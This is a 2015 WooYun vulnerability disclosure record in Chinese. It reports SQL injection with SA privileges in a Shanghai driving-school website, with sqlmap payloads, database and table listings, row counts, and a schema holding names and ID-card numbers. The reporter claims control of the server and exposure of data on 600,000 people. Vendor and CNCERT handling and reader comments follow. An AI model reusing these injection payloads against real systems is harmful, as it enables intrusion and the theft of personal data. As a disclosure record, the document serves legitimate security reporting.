{"id": 71769, "wybug_id": "wooyun-2015-0148081", "wybug_title": "某驾校网某处注入漏洞(SA权限服务器)涉及60W用户重要信息（姓名\\电话\\身份证\\住址等信息）", "wybug_corp": "某驾校", "wybug_author": "路人甲", "wybug_date": "2015-10-20 16:34", "wybug_open_date": "2015-12-07 17:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向公众公开  简要描述： 某驾校网某处注入漏洞(SA权限,服务器拿下）泄露60W信息（姓名，电话，身份证，住址等信息） 详细说明：  上海驾校网某处注入漏洞+SA权限（服务器已经沦陷），泄露60W重要信息（姓名，电话，身份证，住址等信息）。。。。。权限是  ： nt authority\\system   服务器已经拿下，泄露重要信息。。。。。。。链接：http://**.**.**.**/jgxx2.asp?id=9\nsqlmap identified the following injection points with a total of 61 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=9 AND 6839=6839    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=9; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: id=9 AND 8384=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusersAS sys7)---[15:38:52] [INFO] testing Microsoft SQL Server[15:38:53] [INFO] confirming Microsoft SQL Server[15:38:54] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2008available databases [18]:[*] DTA[*] ExamWeb[*] ExamWebTest[*] hpk[*] hpk20130122[*] HPK20130515[*] hpk20130827[*] hpk20150803[*] hpksh[*] jx[*] master[*] model[*] msdb[*] QPS[*] RCMDVRServer[*] ReportServer[*] ReportServerTempDB[*] tempdbcurrent user:    'sa'current database:    'jx'Database: jx[110 tables]+----------------------------+| 091123                     || 2010061                    || 2014coach                  || BusinessUsers              || COACH                      || COACH_BAD_RECORD           || COACH_BAD_RECORD_2009      || COACH_BAD_RECORD_2010      || COACH_BAD_RECORD_ITEM      || COACH_BAD_RECORD_ITEM_2010 || COACH_BOARD                || COACH_BOARD_2013           || COACH_CHANGE               || COACH_CHANGE_his           || COACH_RE_EDUCATE           || COACH_temp2013             || COACH_temp2014             || CoachRe                    || D99_CMD                    || D99_REG                    || D99_Tmp                    || ExamQuestion               || JXRead                     || PriceBase                  || S3_Tmp                     || SubjectType                || TRAIN_UNIT_xh              || VIEW_091123                || VIEW_2006                  || VIEW_2007                  || VIEW_2008                  || VIEW_2009                  || VIEW_2010                  || VIEW_2011                  || VIEW_2012                  || VIEW_2013                  || View_2014                  || WZRY2014                   || YZ_COACH_HONESTY           || YZ_COACH_HONESTY_2009      || YZ_COACH_HONESTY_2010      || YZ_HONESTY_KIND            || YZ_HONESTY_KIND_2009       || YZ_TRAIN_UNIT              || YZ_TRAIN_UNIT22            || ZZ_SATISFY                 || ZZ_SATISFY_detail          || ZZ_suggest                 || YZ_HONESTY_KIND_20 0       || ZZ_suggest_te`p            || \\x10bo.20140504coach       || hpknew.????????????-??| hpknew.????????????-??| hpknew.????????????--??| hpknew.????????????-??| jxre`dtmp                  || _zhaoxy                    || _zhaoxy_dir                || coach2009                  || coach2010                  || coach2012                  || coach20120605              || coach2013                  || coach20131017              || coach2014                  || coach2015                  || coach_2012                 || coach_2013                 || coach_2014                 || coach_bad_record_2011      || coach_board_2014           || coach_board_2015           || coach_imp_temp             || coach_level                || coach_level_2008           || coach_level_2009           || coach_level_2010           || coach_level_2011           || coach_level_temp           || coach_show                 || coach_show_his             || dtprnperties               || foofoofoo                  || jxpwd                      || jxpwd2                     || pangolin_test_tabl@        || price_private              || price_public               || pupil_dc1                  || pupil_fk                   || sqlmapoutput               || t_jiaozhu                  || tb_sign_up                 || tb_user                    || tb_wenda                   || tb_zcfg                    || train_unit                 || train_unit22               || train_unit_2010            || train_unit_honespy         || tszx_tab                   || veficle                    || vehicle201312              || vehicle_typ@               || yz_coach_honesty_2011      || zzPtrain_unit_temp         || hpknew.coach2011           || hpknew.coach2011temp       || hpknew.coach2011temp1      || hpknew.coachre2010         |+----------------------------+\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  \nDatabase: jx+--------------------------------+---------+| Table                          | Entries |+--------------------------------+---------+| dbo.YZ_COACH_HONESTY           | 648180  || dbo.yz_coach_honesty_2011      | 543960  || dbo.YZ_COACH_HONESTY_2010      | 472729  || dbo.YZ_COACH_HONESTY_2009      | 328363  || dbo.COACH_BOARD                | 165593  || dbo.coach_board_2015           | 150608  || dbo.COACH_RE_EDUCATE           | 145770  || dbo.coach_board_2014           | 116794  || dbo.COACH_BOARD_2013           | 89046   || dbo.coach_level                | 79560   || dbo.coach_level_2011           | 57980   || dbo.coach_level_2010           | 39848   || dbo.CoachRe                    | 25813   || dbo.COACH                      | 25377   || dbo.coach_imp_temp             | 25377   || dbo.coach_2014                 | 24513   || dbo.COACH_temp2014             | 24513   || dbo.coach_level_2009           | 24033   || dbo.View_2014                  | 23951   || dbo.coach2014                  | 23688   || dbo.coach2015                  | 23688   || dbo.VIEW_2012                  | 22976   || dbo.VIEW_2013                  | 22721   || dbo.coach2013                  | 21852   || dbo.coach_level_temp           | 21580   || dbo.coach2012                  | 21306   || dbo.coach_2012                 | 20725   || dbo.coach_2013                 | 20592   || hpknew.coachre2010             | 19498   || dbo.VIEW_2011                  | 18787   || hpknew.coach2011temp1          | 18504   || hpknew.coach2011               | 18365   || hpknew.coach2011temp           | 18357   || dbo.coach20120605              | 18132   || dbo.coach2010                  | 16438   || dbo.VIEW_2010                  | 15979   || dbo.vehicle201312              | 15294   || dbo.coach2009                  | 14937   || dbo.VIEW_2008                  | 14843   || dbo.VIEW_2006                  | 14841   || dbo.VIEW_2007                  | 14839   || dbo.VIEW_091123                | 14837   || dbo.VIEW_2009                  | 14837   || dbo.ZZ_suggest                 | 9694    || dbo.coach20131017              | 9615    || dbo.coach_level_2008           | 9249    || dbo.coach_bad_record_2011      | 2884    || dbo.COACH_BAD_RECORD_2009      | 2673    || dbo.COACH_BAD_RECORD_2010      | 2536    || dbo.COACH_BAD_RECORD           | 2225    || dbo.ZZ_SATISFY_detail          | 1445    || dbo.ExamQuestion               | 1386    || dbo.pupil_dc1                  | 1185    || dbo.tb_sign_up                 | 1144    || dbo.tszx_tab                   | 747     || dbo.COACH_CHANGE_his           | 746     || dbo.PriceBase                  | 598     || dbo.WZRY2014                   | 590     || dbo.ZZ_SATISFY                 | 411     || dbo.coach_show_his             | 390     || dbo.COACH_CHANGE               | 332     || dbo.coach_show                 | 243     || dbo.YZ_TRAIN_UNIT              | 225     || dbo.train_unit22               | 220     || dbo.TRAIN_UNIT_xh              | 220     || dbo.jxpwd                      | 219     || dbo.train_unit                 | 219     || dbo.YZ_TRAIN_UNIT22            | 218     || dbo.BusinessUsers              | 210     || dbo.train_unit_2010            | 190     |Database: jxTable: YZ_COACH_HONESTY[19 columns]+---------------------------+------------------+| Column                    | Type             |+---------------------------+------------------+| COACH_NO                  | varchar          || COACH_NO_NEW              | varchar          || H_MONTH                   | varchar          || H_SCORE                   | float            || H_YEAR                    | varchar          || HID                       | int              || HONESTY_COME_FROM         | varchar          || HONESTY_KIND              | varchar          || HONESTY_PERCENT           | float            || HONESTY_SUB_KIND_NAME     | varchar          || HONESTY_SUB_KIND_STANDARD | varchar          || id_card                   | varchar          || IS_SWAP                   | int              || MEMO                      | varchar          || NAME                      | varchar          || SUBMIT_DATE               | datetime         || TRAIN_UNIT_CODE           | varchar          || YZ_COACH_HONESTY_ID       | uniqueidentifier || YZ_HONESTY_KIND_ID        | varchar          |+---------------------------+------------------+名字、分数、年龄、教练序号、姓名、身份证号敏感数据泄露，包括：姓名，电话，身份证，住址等信息身份证、姓名、电话和住址nt authority\\system????? DNS ?? . . . . . . . :???? IPv6 ??. . . . . . . . : fe80::cdeb:4df4:5c8b:8a01%14IPv4 ?? . . . . . . . . . . . . : **.**.**.**????  . . . . . . . . . . . . : **.**.**.**????. . . . . . . . . . . . . : **.**.**.**Pv6 ??. . . . . . . . : fe80::4961:92c2:6b16:b66f%13IPv4 ?? . . . . . . . . . . . . : **.**.**.**10????  . . . . . . . . . . . . : **.**.**.**????. . . . . . . . . . . . . : **.**.**.**\n\n\n\n\n\n\n\n\n\n\n   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-23 17:15 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给上海分中心,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-20 16:35 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | Talk is cheap,show me the shell.)\t\t \n  是通用的那个驾校吗？    \n     2015-10-20 16:36 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | Talk is cheap,show me the shell.)\t\t \n  哦不是- -你报的不是通用。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}